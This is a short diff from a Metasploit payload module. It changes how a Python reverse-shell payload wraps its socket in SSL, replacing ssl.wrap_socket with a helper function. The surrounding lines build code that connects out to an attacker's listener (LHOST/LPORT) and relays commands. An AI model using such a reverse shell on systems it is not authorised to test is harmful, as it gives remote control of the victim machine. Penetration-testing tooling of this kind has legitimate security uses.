@@ -52,10 +52,10 @@ module MetasploitModule
     cmd = ''
     dead = Rex::Text.rand_text_alpha(2)
     # Set up the socket
-    cmd += "import socket,subprocess,os,ssl\n"
+    cmd += "import socket,subprocess,os\n"
     cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
     cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-    cmd += "s=ssl.wrap_socket(so)\n"
+    cmd += py_ssl_wrap_socket('so', 's')
     # The actual IO
     cmd += "#{dead}=False\n"
     cmd += "while not #{dead}:\n"
